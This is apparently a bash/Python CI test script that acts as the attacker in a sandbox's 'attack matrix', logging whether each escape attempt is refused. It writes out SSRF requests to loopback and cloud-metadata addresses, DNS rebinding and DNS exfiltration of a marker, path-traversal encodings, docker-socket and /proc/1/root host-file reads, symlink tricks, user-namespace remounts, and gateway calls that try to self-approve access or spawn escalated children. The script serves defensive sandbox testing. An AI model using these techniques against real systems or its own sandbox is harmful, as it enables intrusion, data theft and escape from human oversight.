#!/bin/bash
# The attack matrix's attacker (#215, #326), run inside a program box by ci/attack-matrix.sh. It
# tries every way out of its reach the matrix knows, and writes one line per attempt to
# out/attempts.tsv: `<attempt>\t<outcome>\t<detail>`. Outcomes:
#   refused    wicket (or the box) refused it: nothing left the box
#   asked      it became a request for a human, and nothing was granted
#   contained  it reached an allowed upstream, which saw a path within the reach rule
#   ok / FAIL  a control: something the zone allows, which must work
#   skipped    it couldn't be tried here (an upstream it needs was down)
#   GOT        it got through: an escape
# Every response body is kept under out/bodies/, so the host can look for its canaries in what the
# box got back. /workspace/atk.env, written by the host, names what the box is told about the host
# (an attacker is assumed to know the layout, never the values planted there).
set -u
cd /workspace || exit 1
# shellcheck disable=SC1091
set -a; . /workspace/atk.env; set +a
out=/workspace/out
mkdir -p "$out/bodies" "$out/hdrs"
tsv=$out/attempts.tsv
: >"$tsv"
note() { printf '%s\t%s\t%s\n' "$1" "$2" "$(printf '%s' "$3" | tr '\t\n' '  ' | cut -c1-300)" >>"$tsv"; }
PROXY=http://wicket.internal:3128
GW=http://wicket.internal:8081/mcp

# One HTTP attempt: refused if curl got nothing or wicket answered (its refusals carry x-wicket),
# GOT if anything else answered.
http() { # id, curl args...
  local id=$1 code rc
  shift
  code=$(curl -s -m 20 -D "$out/hdrs/$id" -o "$out/bodies/$id" -w '%{http_code}' "$@" 2>/dev/null)
  rc=$?
  local kind
  kind=$(grep -i '^x-wicket:' "$out/hdrs/$id" 2>/dev/null | tail -1 | cut -d: -f2 | tr -d ' \r')
  if [ -z "$code" ] || [ "$code" = 000 ]; then
    note "$id" refused "no answer (curl exit $rc${kind:+, wicket: $kind})"
  elif [ -n "$kind" ]; then
    note "$id" refused "HTTP $code, wicket: $kind"
  else
    note "$id" GOT "HTTP $code from upstream"
  fi
}

# A request to the echo host (it answers with the URL it was asked for): contained if the path it
# saw is within the zone's rules for it, GOT if outside them.
ECHO=
echo_up=0
echo_path() { python3 -I -c 'import json,sys,urllib.parse; print(urllib.parse.urlsplit(json.load(open(sys.argv[1]))["url"]).path)' "$1" 2>/dev/null; }
within() { # the zone's rules for the echo host, as the upstream reads the path (decoded, dots resolved)
  python3 -I - "$1" "$2" <<'PY'
import posixpath, sys, urllib.parse
p = posixpath.normpath(urllib.parse.unquote(sys.argv[1]))
if sys.argv[2] == "granted":
    ok = p == "/anything/granted" or p.startswith("/anything/granted/")
else:
    ok = (p == "/get" or p.startswith("/anything/public/")) and not p.lower().startswith("/anything/public/forbidden")
sys.exit(0 if ok else 1)
PY
}
echo_try() { # id, rules (public|granted), curl args...
  local id=$1 rules=$2 code
  shift 2
  if [ "$echo_up" != 1 ]; then note "$id" skipped "the echo host didn't answer the control"; return; fi
  code=$(curl -s -m 20 -D "$out/hdrs/$id" -o "$out/bodies/$id" -w '%{http_code}' "$@" 2>/dev/null)
  if grep -qi '^x-wicket:' "$out/hdrs/$id" 2>/dev/null || [ -z "$code" ] || [ "$code" = 000 ]; then
    note "$id" refused "HTTP ${code:-000}, $(grep -i '^x-wicket:' "$out/hdrs/$id" 2>/dev/null | tail -1 | tr -d '\r')"
    return
  fi
  local p
  p=$(echo_path "$out/bodies/$id")
  if [ -z "$p" ]; then note "$id" GOT "HTTP $code from upstream, not an echo"; return; fi
  if within "$p" "$rules"; then note "$id" contained "HTTP $code, upstream saw $p"; else note "$id" GOT "HTTP $code, upstream saw $p"; fi
}

# A raw TCP connection, no proxy: refused unless it connects.
tcp() { # id, host, port
  if timeout 5 bash -c "exec 3<>/dev/tcp/$2/$3" 2>/dev/null; then note "$1" GOT "connected to $2:$3"; else note "$1" refused "no connection to $2:$3"; fi
}

# A gateway tool call (MCP over HTTP): its answer's text, and whether it was an error.
mcp() { # tool, arguments json -> prints "is_error<TAB>text"
  curl -s -m "${MCP_TIMEOUT:-30}" "$GW" -H 'content-type: application/json' -H 'accept: application/json, text/event-stream' \
    -d "{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"tools/call\",\"params\":{\"name\":\"$1\",\"arguments\":$2}}" 2>/dev/null |
    sed -n 's/^data: //p; /^{/p' | head -1 |
    python3 -I -c 'import json,sys
try:
    r = json.load(sys.stdin)
except ValueError:
    print("true\tno answer"); sys.exit()
if "error" in r:
    print("true\t" + json.dumps(r["error"])); sys.exit()
res = r.get("result", {})
text = " ".join(c.get("text", "") for c in res.get("content", []))
print(("true" if res.get("isError") else "false") + "\t" + text)'
}
# A tool call that must not succeed: refused if it is an error, asked if it filed a request for a
# human (the host checks nobody granted it), GOT otherwise.
tool() { # id, tool, arguments
  local r err text
  r=$(mcp "$2" "$3")
  err=${r%%$'\t'*}
  text=${r#*$'\t'}
  printf '%s\n' "$text" >"$out/bodies/$1"
  if [ "$err" = true ] || grep -qiE '^(not (requested|decided|linked|sent|delivered)|refused)' <<<"$text"; then
    note "$1" refused "$text"
  elif grep -qE '\b[rs]-[0-9a-z]{4,}' <<<"$text" && ! grep -qiE '^(granted|linked|approved|connected)' <<<"$text"; then
    note "$1" asked "$text"
  else
    note "$1" GOT "$text"
  fi
}

# ---- controls: what the zone allows must work ----
code=$(curl -s -m 20 -o "$out/bodies/control-reach" -w '%{http_code}' https://example.com/ 2>/dev/null)
if [ "$code" = 200 ]; then note control-reach ok "GET https://example.com/ -> 200"; else note control-reach FAIL "GET https://example.com/ -> $code"; fi
# The first echo host that answers; the other's rows are the same.
for e in httpbin.org httpbingo.org; do
  code=$(curl -s -m 20 -D "$out/hdrs/control-echo" -o "$out/bodies/control-echo" -w '%{http_code}' "https://$e/get" 2>/dev/null)
  if [ "$code" = 200 ] && [ -n "$(echo_path "$out/bodies/control-echo")" ]; then ECHO=$e; break; fi
done
if [ -n "$ECHO" ]; then
  echo_up=1
  # The injected credential came back in the echo; the host checks wicket masked it (#362).
  if grep -qi '"authorization"' "$out/bodies/control-echo"; then
    note control-echo ok "GET https://$ECHO/get -> 200, the injected credential echoed back"
  else
    note control-echo FAIL "GET https://$ECHO/get -> 200 without the injected credential"
  fi
elif grep -qi '^x-wicket:' "$out/hdrs/control-echo"; then
  note control-echo FAIL "GET https://httpbingo.org/get -> $code from wicket: $(grep -i '^x-wicket:' "$out/hdrs/control-echo" | tr -d '\r')"
else
  ECHO=httpbin.org
  note control-echo skipped "neither echo host answered ($code): their rows are skipped"
fi
a=$(getent hosts example.com | awk '{print $1}' | head -1)
case "$a" in 198.19.*) note control-dns ok "example.com -> $a" ;; *) note control-dns FAIL "example.com -> ${a:-nothing}" ;; esac
r=$(mcp whoami '{}')
if [ "${r%%$'\t'*}" = false ]; then note control-gateway ok "whoami answered"; else note control-gateway FAIL "whoami: ${r#*$'\t'}"; fi

# The per-node service this zone uses (#579): its link needs a human (its reach is wider than this
# zone's), so it must never open. Probed in the background while everything else runs.
(
  for _ in $(seq 18); do
    if timeout 3 bash -c "exec 3<>/dev/tcp/atk-svc.wicket.internal/$SVC_PORT" 2>/dev/null; then
      curl -s -m 5 --noproxy '*' "http://atk-svc.wicket.internal:$SVC_PORT/" -o "$out/bodies/svc-link" 2>/dev/null
      note svc-link GOT "connected to atk-svc.wicket.internal:$SVC_PORT"
      exit
    fi
    sleep 5
  done
  note svc-link refused "atk-svc.wicket.internal:$SVC_PORT never connected (90 s): $(grep -c atk-svc /etc/hosts) hosts lines"
) &
svc_probe=$!

# ---- through the proxy, outside the zone ----
http other-host http://example.org/
http other-host-https https://example.org/
http other-path http://example.com/admin
http other-method -X POST http://example.com/
http other-method-put -X PUT --data x http://example.com/
http trace-method -X TRACE http://example.com/
http host-header -H "Host: example.org" http://example.com/
http absolute-uri --request-target "http://example.org/" http://example.com/
http method-override -H "X-HTTP-Method-Override: POST" http://example.com/
http url-rewrite -H "X-Original-URL: /admin" http://example.com/
http trailing-dot https://example.com./admin
http upper-host https://EXAMPLE.COM/admin
http userinfo-host "http://example.com@example.org/"
http connect-other-host -p https://example.org/
http connect-ip -p https://1.1.1.1/
http host-canary "http://$HOST_IP:$CANARY_PORT/"
http host-canary-tunnel -p "http://$HOST_IP:$CANARY_PORT/"
http loopback-canary "http://127.0.0.1:$CANARY_PORT/"
http loopback-decimal "http://2130706433:$CANARY_PORT/"
http loopback-hex "http://0x7f.1:$CANARY_PORT/"
http loopback-v6 "http://[::1]:$CANARY_PORT/"
http loopback-mapped "http://[::ffff:127.0.0.1]:$CANARY_PORT/"
http localhost-name "http://localhost:$CANARY_PORT/"
http cloud-metadata http://169.254.169.254/latest/meta-data/
http cloud-metadata-v6 "http://[fd00:ec2::254]/latest/meta-data/"
http gcp-metadata -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/
http azure-wireserver "http://168.63.129.16/machine?comp=goalstate"
http ip-literal-public http://1.1.1.1/
http ip-literal-v6 "http://[2606:4700:4700::1111]/"
http proxy-loop http://wicket.internal:3128/
http proxy-to-gateway "$GW" --proxy "$PROXY" --noproxy ''
http proxy-to-198 http://198.18.0.1:8081/mcp --proxy "$PROXY" --noproxy ''
# Names in reach whose DNS answers are the host's own, loopback, private or the metadata address: the
# proxy dials only public addresses (#116), whatever the zone allows. Its 502 must say it refused the
# address; any other 502 means it dialled it.
dial() { # id, curl args...
  local id=$1 code
  shift
  code=$(curl -s -m 20 -D "$out/hdrs/$id" -o "$out/bodies/$id" -w '%{http_code}' "$@" 2>/dev/null)
  if ! grep -qi '^x-wicket:' "$out/hdrs/$id" 2>/dev/null; then
    if [ -z "$code" ] || [ "$code" = 000 ]; then note "$id" refused "no answer"; else note "$id" GOT "HTTP $code from upstream"; fi
  elif [ "$code" != 502 ]; then
    note "$id" refused "HTTP $code, wicket: $(grep -i '^x-wicket:' "$out/hdrs/$id" | tail -1 | cut -d: -f2 | tr -d ' \r')"
  elif grep -q 'never reachable from a box' "$out/bodies/$id"; then
    note "$id" refused "HTTP 502: the proxy refused the address"
  elif grep -qiE 'dns error|failed to lookup|no address|resolv' "$out/bodies/$id"; then
    note "$id" skipped "the name didn't resolve: $(tr -d '\n' <"$out/bodies/$id" | grep -o '"detail"[^,]*' | cut -c1-150)"
  else
    note "$id" GOT "HTTP 502, the proxy dialled it: $(tr -d '\n' <"$out/bodies/$id" | grep -o '"detail"[^,]*' | cut -c1-150)"
  fi
}
dial rebind-loopback http://127.0.0.1.nip.io/
dial rebind-loopback-https https://127.0.0.1.nip.io/
dial rebind-private http://10.0.0.1.nip.io/
dial rebind-host "http://$HOST_IP.nip.io/"
dial rebind-metadata http://169.254.169.254.nip.io/latest/meta-data/
dial rebind-localtest http://localtest.me/
# DNS over HTTPS: resolvers are hosts like any other, outside the zone.
http doh-cloudflare -H 'accept: application/dns-json' "https://cloudflare-dns.com/dns-query?name=$BOX_MARK.example.org&type=A"
http doh-google "https://dns.google/resolve?name=$BOX_MARK.example.org"
http doh-ip -H 'accept: application/dns-json' "https://1.1.1.1/dns-query?name=$BOX_MARK.example.org"
# The zone's other ports: reach names a host, but the box asks for a port.
http other-port "http://example.com:8080/"
http other-port-canary "http://example.com:$CANARY_PORT/"

# ---- path tricks against the reach rules (the echo host shows what the upstream saw) ----
echo_try control-echo-rule public "https://$ECHO/anything/public/x"
echo_try path-dotdot public --path-as-is "https://$ECHO/anything/public/../private"
echo_try path-dot-escaped public "https://$ECHO/anything/public/%2e%2e/private"
echo_try path-dot-mixed public "https://$ECHO/anything/public/.%2e/private"
echo_try path-slash-escaped public "https://$ECHO/anything/public%2f..%2fprivate"
echo_try path-slash-escaped-lower public "https://$ECHO/anything/public/..%2fprivate"
echo_try path-backslash public --path-as-is "https://$ECHO/anything/public/..%5cprivate"
echo_try path-double-slash public --path-as-is "https://$ECHO//anything/public/x"
echo_try path-semicolon public --path-as-is "https://$ECHO/anything/public/..;/private"
echo_try path-double-escape public "https://$ECHO/anything/public/%252e%252e/private"
echo_try path-null public "https://$ECHO/anything/public/x%00/../../private"
echo_try path-case public "https://$ECHO/anything/PUBLIC/x"
echo_try path-sibling public "https://$ECHO/anything/public-secrets"
echo_try path-forbidden public "https://$ECHO/anything/public/forbidden/x"
echo_try path-forbidden-case public "https://$ECHO/anything/public/FORBIDDEN/x"
echo_try path-forbidden-escaped public "https://$ECHO/anything/public/%66orbidden/x"
echo_try path-forbidden-dot public --path-as-is "https://$ECHO/anything/public/x/../forbidden/x"
echo_try path-get-dotdot public --path-as-is "https://$ECHO/get/../headers"
echo_try path-get-suffix public "https://$ECHO/get/../../headers"
echo_try path-fragment public --path-as-is "https://$ECHO/get#/../headers"
echo_try path-query public "https://$ECHO/get?/../headers"
echo_try method-on-echo public -X POST --data x "https://$ECHO/anything/public/x"
# Over plain HTTP the credential is never sent (#inject): refused, not a credential in the clear.
http echo-plain-http "http://${ECHO:-httpbin.org}/get"

# ---- the injected credential, reflected (#362): the host checks the bodies for it ----
if [ "$echo_up" = 1 ]; then
  for v in gzip br deflate; do
    echo_try "reflect-encoding-$v" public -H "Accept-Encoding: $v" "https://$ECHO/get"
  done
  echo_try reflect-range public -H "Range: bytes=60-90" "https://$ECHO/get"
  echo_try reflect-range-multi public -H "Range: bytes=0-10,80-120" "https://$ECHO/get"
  echo_try reflect-http1 public --http1.1 "https://$ECHO/get"
  echo_try reflect-h2 public --http2 "https://$ECHO/get"
  # The box's own Authorization header: dropped, so the echo shows the injected one (masked), not this.
  echo_try reflect-own-auth public -H "Authorization: Bearer $BOX_MARK" "https://$ECHO/get"
fi

# ---- around the proxy ----
http no-proxy --noproxy '*' http://example.com/
http no-proxy-https --noproxy '*' https://example.com/
tcp raw-tcp-public 1.1.1.1 443
tcp raw-tcp-dns 8.8.8.8 53
tcp raw-tcp-host "$HOST_IP" "$CANARY_PORT"
tcp raw-tcp-v6 2606:4700:4700::1111 443
tcp raw-tcp-gateway-ip 172.17.0.1 "$CANARY_PORT"
for p in 22 80 443 2375 2376 3129 5000 8000 8082 9000 9999; do tcp "forwarder-port-$p" wicket.internal "$p"; done
tcp forwarder-port-canary wicket.internal "$CANARY_PORT"
syn=$(getent hosts example.com | awk '{print $1}' | head -1)
for p in 22 80 8080; do tcp "synthetic-port-$p" "$syn" "$p"; done
tcp synthetic-port-canary "$syn" "$CANARY_PORT"
python3 -I - "$out" <<'PY' >>"$tsv"
import os, socket, struct, sys, time
out = sys.argv[1]

def note(i, o, d):
    print(f"{i}\t{o}\t{d}")

def query(name, qtype=1, tid=0x4242):
    q = struct.pack(">HHHHHH", tid, 0x0100, 1, 0, 0, 0)
    for label in name.split("."):
        q += bytes([len(label)]) + label.encode()
    return q + b"\x00" + struct.pack(">HH", qtype, 1)

def answers(resp):
    """The A records in a DNS answer, and its rcode."""
    rcode = resp[3] & 0xF
    an = struct.unpack(">H", resp[6:8])[0]
    i = 12
    while resp[i]:
        i += resp[i] + 1
    i += 5
    ips = []
    for _ in range(an):
        if resp[i] & 0xC0 == 0xC0:
            i += 2
        else:
            while resp[i]:
                i += resp[i] + 1
            i += 1
        t, _, _, ln = struct.unpack(">HHIH", resp[i:i + 10])
        i += 10
        if t == 1 and ln == 4:
            ips.append(socket.inet_ntoa(resp[i:i + 4]))
        i += ln
    return rcode, ips

def udp(i, host, port, payload):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(4)
    try:
        s.sendto(payload, (host, port))
        data, frm = s.recvfrom(4096)
        return data
    except OSError as e:
        return e
    finally:
        s.close()

# DNS straight to public resolvers: no route.
for i, host in (("udp-dns-public", "8.8.8.8"), ("udp-dns-public-2", "1.1.1.1")):
    r = udp(i, host, 53, query("example.org"))
    note(i, "GOT" if isinstance(r, bytes) else "refused", f"answer from {host}" if isinstance(r, bytes) else f"{r}")

# DNS through wicket's resolver: answers only from wicket's synthetic range, or none (#20, #19).
mark = os.environ.get("BOX_MARK", "x")
for i, name, qtype in (
    ("dns-exfil-label", f"{mark}.example.org", 1),
    ("dns-exfil-deep", f"{mark}.a.b.c.example.org", 1),
    ("dns-exfil-unregistered", f"{mark}.no-such-domain-{mark[:12]}.invalid", 1),
    ("dns-txt", "example.com", 16),
    ("dns-any", "example.com", 255),
    ("dns-ptr", "1.1.1.1.in-addr.arpa", 12),
    ("dns-metadata-name", "metadata.google.internal", 1),
):
    r = udp(i, "198.18.0.1", 53, query(name, qtype))
    if not isinstance(r, bytes):
        note(i, "refused", f"no answer: {r}")
        continue
    try:
        rcode, ips = answers(r)
    except (IndexError, struct.error):
        note(i, "refused", "an answer it couldn't parse")
        continue
    bad = [ip for ip in ips if not ip.startswith("198.19.")]
    note(i, "GOT" if bad else "refused", f"rcode {rcode}, A {ips or 'none'}")

# DNS over TCP to wicket's resolver, and a zone transfer.
for i, name, qtype in (("dns-tcp", f"{mark}.example.org", 1), ("dns-axfr", "example.com", 252)):
    try:
        s = socket.create_connection(("198.18.0.1", 53), timeout=4)
        q = query(name, qtype)
        s.sendall(struct.pack(">H", len(q)) + q)
        data = s.recv(4096)
        s.close()
        if len(data) > 2:
            rcode, ips = answers(data[2:])
            bad = [ip for ip in ips if not ip.startswith("198.19.")]
            note(i, "GOT" if bad else "refused", f"rcode {rcode}, A {ips or 'none'}")
        else:
            note(i, "refused", "no answer")
    except (OSError, IndexError, struct.error) as e:
        note(i, "refused", f"{e}")

# Raw and packet sockets: no capability, no route.
for i, fam, typ, proto in (
    ("raw-icmp", socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP),
    ("raw-ip", socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW),
    ("packet-socket", getattr(socket, "AF_PACKET", 17), socket.SOCK_RAW, 0x0300),
):
    try:
        s = socket.socket(fam, typ, proto)
    except OSError as e:
        note(i, "refused", f"socket: {e}")
        continue
    try:
        if i == "raw-icmp":
            s.settimeout(3)
            s.sendto(b"\x08\x00\xf7\xff\x00\x00\x00\x00", ("1.1.1.1", 0))
            s.recvfrom(1024)
            note(i, "GOT", "an ICMP echo answered")
        else:
            note(i, "refused", "opened, but the box has no network to send on")
    except OSError as e:
        note(i, "refused", f"send: {e}")
    finally:
        s.close()
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_ICMP)
    s.settimeout(3)
    s.sendto(b"\x08\x00\xf7\xff\x00\x00\x00\x00", ("1.1.1.1", 0))
    s.recvfrom(1024)
    note("ping-socket", "GOT", "an ICMP echo answered")
except OSError as e:
    note("ping-socket", "refused", f"{e}")

# The forwarder's UDP relay, spoken to directly: frames naming destinations wicket never minted.
def frame(dst, dport, payload, src="127.0.0.1", sport=40000):
    return struct.pack(">BBHHH", 1, 0, 0, sport, dport) + socket.inet_aton(src) + socket.inet_aton(dst) + payload

for i, dst, dport, payload in (
    ("udp-relay-public-dns", "8.8.8.8", 53, query("example.org")),
    ("udp-relay-quic-ip", "1.1.1.1", 443, b"\xc0" + os.urandom(1199)),
    ("udp-relay-wicket-dns-exfil", "198.18.0.1", 53, query(f"{mark}.relay.example.org")),
    ("udp-relay-quic-synthetic-unreached", "198.19.255.254", 443, b"\xc0" + os.urandom(1199)),
):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_SEQPACKET)
        s.settimeout(4)
        s.connect("/wicket/sock/udp.sock")
        s.send(frame(dst, dport, payload))
        data = s.recv(70000)
        s.close()
        body = data[16:]
        # Any frame to port 53 is answered by wicket's resolver, whatever address it names.
        if dport == 53:
            rcode, ips = answers(body)
            bad = [ip for ip in ips if not ip.startswith("198.19.")]
            note(i, "GOT" if bad else "refused", f"wicket's answer: rcode {rcode}, A {ips or 'none'}")
        else:
            note(i, "GOT", f"{len(body)} bytes back from {dst}:{dport}")
    except (OSError, IndexError, struct.error) as e:
        note(i, "refused", f"{e}")

# Unix sockets on the host, by path (not mounted) and abstract (the box's own namespace).
host_sock = os.environ.get("HOST_SOCK", "")
abstract = os.environ.get("ABSTRACT", "")
for i, addr in (("host-unix-socket", host_sock), ("host-abstract-socket", "\0" + abstract), ("docker-socket", "/var/run/docker.sock"),
                ("containerd-socket", "/run/containerd/containerd.sock")):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect(addr)
        data = s.recv(200)
        open(os.path.join(out, "bodies", i), "wb").write(data)
        note(i, "GOT", f"connected, {len(data)} bytes")
    except OSError as e:
        note(i, "refused", f"{e}")
PY

# The forwarder's host sockets, spoken to directly, as the forwarder would.
r=$(curl -s -m 10 --unix-socket /wicket/sock/egress.sock -o "$out/bodies/egress-sock-direct" -w '%{http_code}' -D "$out/hdrs/egress-sock-direct" http://example.org/ 2>/dev/null)
if grep -qi '^x-wicket:' "$out/hdrs/egress-sock-direct" 2>/dev/null || [ -z "$r" ] || [ "$r" = 000 ]; then note egress-sock-direct refused "HTTP ${r:-000}"; else note egress-sock-direct GOT "HTTP $r"; fi
r=$(curl -s -m 10 --unix-socket /wicket/sock/llm.sock -o "$out/bodies/llm-sock" -w '%{http_code}' -D "$out/hdrs/llm-sock" -X POST http://wicket.internal/v1/messages -H 'content-type: application/json' -d '{"model":"x","max_tokens":1,"messages":[]}' 2>/dev/null)
if [ -z "$r" ] || [ "$r" = 000 ] || [ "${r:0:1}" = 4 ] || [ "${r:0:1}" = 5 ]; then note llm-sock refused "HTTP ${r:-000}"; else note llm-sock GOT "HTTP $r"; fi
http model-proxy -X POST http://wicket.internal:8080/v1/messages -H 'content-type: application/json' -d '{"model":"x","max_tokens":1,"messages":[]}'
http model-proxy-profile http://wicket.internal:8080/api/oauth/profile

# ---- the gateway's tools: asking is allowed, getting is not ----
MCP_TIMEOUT=15
tool ask-other-host request_access '{"url":"https://example.org/","reason":"attack matrix"}'
tool ask-metadata request_access '{"url":"http://169.254.169.254/latest/meta-data/","reason":"attack matrix"}'
tool ask-gateway request_access '{"url":"http://wicket.internal:8081/mcp","reason":"attack matrix"}'
tool ask-standing-wide request_access '{"url":"https://example.org/","scope":"standing","methods":["GET","POST","PUT","DELETE"],"paths":["/**"],"dangerous":true,"reason":"attack matrix"}'
tool ask-standing-wildcard request_access '{"url":"https://*.example.org/","scope":"standing","paths":["/**"],"reason":"attack matrix"}'
tool ask-standing-ip request_access '{"url":"https://1.1.1.1/","scope":"standing","paths":["/**"],"reason":"attack matrix"}'
tool ask-standing-wicket request_access '{"url":"http://wicket.internal:8081/","scope":"standing","paths":["/**"],"reason":"attack matrix"}'
tool ask-standing-other-host-paths request_access '{"url":"https://example.com/","scope":"standing","paths":["/**","//evil.example/**","../**"],"reason":"attack matrix"}'
# Asked, then tried at once: an ask is not a grant.
http after-asking https://example.org/
http after-asking-standing -X POST https://example.org/
tool self-decide decide "{\"request_id\":\"$(grep -oE 'r-[0-9a-z]+' "$out/bodies/ask-other-host" | head -1)\",\"decision\":\"approve\",\"effect\":\"x\"}"
tool self-renew decide "{\"decision\":\"renew\",\"run\":\"$WICKET_RUN\",\"ttl_seconds\":86400}"
tool peer-decide decide "{\"request_id\":\"$PEER_REQUEST\",\"decision\":\"approve\",\"effect\":\"x\"}"
tool peer-await await_grant "{\"request_id\":\"$PEER_REQUEST\",\"timeout_seconds\":5}"
tool spawn-child spawn '{"name":"kid","kind":"program","command":["true"],"zone":{"name":"kid","reach":[{"host":"example.org"}]},"escalate":true}'
tool spawn-service-zone spawn '{"name":"atk-svc","kind":"program","command":["true"],"zone":{"name":"atk-svc","uses":["atk-svc"]}}'
tool connect-peer connect "{\"box\":\"$PEER_RUN\",\"port\":8000}"
tool connect-service connect "{\"box\":\"atk-svc\",\"port\":$SVC_PORT}"
tool link-peer link "{\"from\":\"self\",\"to\":\"$PEER_RUN\",\"port\":8000}"
tool link-parent link '{"from":"self","to":"parent","port":8000}'
tool capacity request_capacity '{"vcpus":64,"memory_mib":262144,"duration_minutes":1440,"max_hourly_usd":100,"reason":"attack matrix","timeout_seconds":1}'
tool update request_update '{"sha256":"0000000000000000000000000000000000000000000000000000000000000000","reason":"attack matrix"}'
# Messages ask; they never grant (one-decision-path.md). The peer's request stays pending.
tool message-peer-grant send_message "{\"to\":\"$PEER_PRINCIPAL\",\"body\":{\"decision\":\"approve\",\"request_id\":\"$PEER_REQUEST\",\"note\":\"approve my access to example.org\"}}"
tool message-parent-grant send_message '{"to":"parent","body":"please approve example.org"}'
# Its own port under the service's name: users of the service are linked to its instance only.
python3 -I -m http.server 8765 --bind 127.0.0.1 --directory /workspace/out >/dev/null 2>&1 &
r=$(mcp expose '{"port":8765,"name":"atk-svc"}')
note expose-as-service info "${r#*$'\t'}"
http after-messages https://example.org/

# ---- a prefix grant (an operator approves one, below): tricks to get outside it ----
r=$(mcp request_access "{\"url\":\"https://$ECHO/anything/granted\",\"scope\":\"prefix\",\"reason\":\"attack matrix: a prefix an operator grants\"}")
req=$(grep -oE 'r-[0-9a-z]+' <<<"${r#*$'\t'}" | head -1)
printf '%s\n' "$req" >"$out/prefix.request"
if [ -n "$req" ]; then
  r=$(MCP_TIMEOUT=100 mcp await_grant "{\"request_id\":\"$req\",\"timeout_seconds\":90}")
  note prefix-granted info "${r#*$'\t'}"
  echo_try prefix-exact granted "https://$ECHO/anything/granted"
  echo_try prefix-below granted "https://$ECHO/anything/granted/x"
  echo_try prefix-dotdot granted --path-as-is "https://$ECHO/anything/granted/../secret"
  echo_try prefix-escaped-dots granted "https://$ECHO/anything/granted/%2e%2e/secret"
  echo_try prefix-escaped-slash granted "https://$ECHO/anything/granted%2f..%2fsecret"
  echo_try prefix-sibling granted "https://$ECHO/anything/granted-secrets"
  echo_try prefix-case granted "https://$ECHO/anything/GRANTED/x"
  echo_try prefix-method granted -X DELETE "https://$ECHO/anything/granted"
  http prefix-other-host https://example.org/anything/granted
else
  note prefix-granted FAIL "request_access scope prefix: ${r#*$'\t'}"
fi

# ---- files: outside its volumes, the host's, the control host's ----
readf() { # id, path
  if [ -r "$2" ] && cp "$2" "$out/bodies/$1" 2>/dev/null; then note "$1" GOT "read $2"; else note "$1" refused "$2: not readable"; fi
}
readf host-file "$HOST_FILE"
readf data-dir-file "$DATA_FILE"
readf host-file-dotdot "/workspace/../../../..$HOST_FILE"
readf host-file-proc-root "/proc/1/root$HOST_FILE"
readf host-file-proc-self "/proc/self/root$HOST_FILE"
readf run-dir-ctl "$RUN_DIR/ctl/run.json"
readf peer-run-dir "$PEER_DIR/workspace/www/index.html"
readf vault "$VAULT_FILE"
# The image's own /etc/shadow is no host secret, but a password hash in it would be a way in.
if grep -q '^root:\$' /etc/shadow 2>/dev/null; then note shadow GOT "root has a password hash"; else note shadow refused "no password hash"; fi
for d in /wicket/sock /wicket/state /wicket/ca /volumes/scratch /workspace; do
  if ls -a "$d" 2>/dev/null | grep -qE '\.(key|db|sqlite)$|^vault|^ledger'; then note "list-$d" GOT "$(ls -a "$d" | tr '\n' ' ')"; else note "list-$d" refused "nothing of the host's"; fi
done
# Symlinks to host paths, left where the host reads after the run: the outbox, the forwarder's
# directory (the node reads entry.times from it), a volume. The host checks it never followed them.
ln -sfn "$HOST_FILE" "$out/result.json" 2>/dev/null
ln -sfn "$HOST_FILE" "$out/leak.txt" 2>/dev/null
ln -sfn "$HOST_DIR" "$out/hostdir" 2>/dev/null
ln -sfn "$HOST_DIR/pwned-out" "$out/pwned-out" 2>/dev/null
ln -sfn "$HOST_FILE" /volumes/scratch/leak 2>/dev/null
ln -sfn "$HOST_DIR/pwned-vol" /volumes/scratch/pwned 2>/dev/null
if rm -f /wicket/sock/entry.times 2>/dev/null && ln -s "$HOST_FILE" /wicket/sock/entry.times 2>/dev/null; then
  note symlink-entry-times info "replaced /wicket/sock/entry.times with a symlink (the host checks it wasn't followed)"
else
  note symlink-entry-times refused "couldn't replace it"
fi
note symlink-outbox info "out/result.json, out/leak.txt, out/hostdir, out/pwned-out and two in /volumes/scratch point at host paths"
for f in /wicket/ca/x /etc/hosts /etc/resolv.conf /usr/local/bin/wicket-fwd /usr/x; do
  if (echo x >>"$f") 2>/dev/null; then note "write-$f" GOT "wrote $f"; else note "write-$f" refused "read-only"; fi
done
if command -v unshare >/dev/null; then
  if unshare -Urm sh -c 'mount -o remount,rw /etc/hosts && echo "1.1.1.1 example.org" >> /etc/hosts' 2>/dev/null; then
    note userns-remount GOT "remounted /etc/hosts read-write"
  else
    note userns-remount refused "the read-only bind stayed read-only"
  fi
  if unshare -Urn sh -c 'ip link set lo up && exit 0' 2>/dev/null && unshare -Ur sh -c "exec 3<>/dev/tcp/1.1.1.1/443" 2>/dev/null; then
    note userns-net GOT "a new user namespace reached 1.1.1.1"
  else
    note userns-net refused "no route from a new namespace either"
  fi
fi
# Signals to processes outside the box: there are none it can see but its own.
if ps -eo pid,comm 2>/dev/null | grep -qE 'dockerd|containerd|wicket node|runsc'; then note host-processes GOT "sees host processes"; else note host-processes refused "only its own processes"; fi

# The service's instance, by its run id once the host has seen it start: still a link that needs a human.
for _ in $(seq 60); do [ -s /workspace/svc.run ] && break; sleep 1; done
if [ -s /workspace/svc.run ]; then
  tool connect-service-run connect "{\"box\":\"$(cat /workspace/svc.run)\",\"port\":$SVC_PORT}"
  tool link-service-run link "{\"from\":\"self\",\"to\":\"$(cat /workspace/svc.run)\",\"port\":$SVC_PORT}"
else
  note connect-service-run FAIL "the host never named the service's instance"
fi
wait "$svc_probe" 2>/dev/null
echo "attack attempts: $(grep -c . "$tsv"), got through: $(grep -c $'\tGOT\t' "$tsv")"
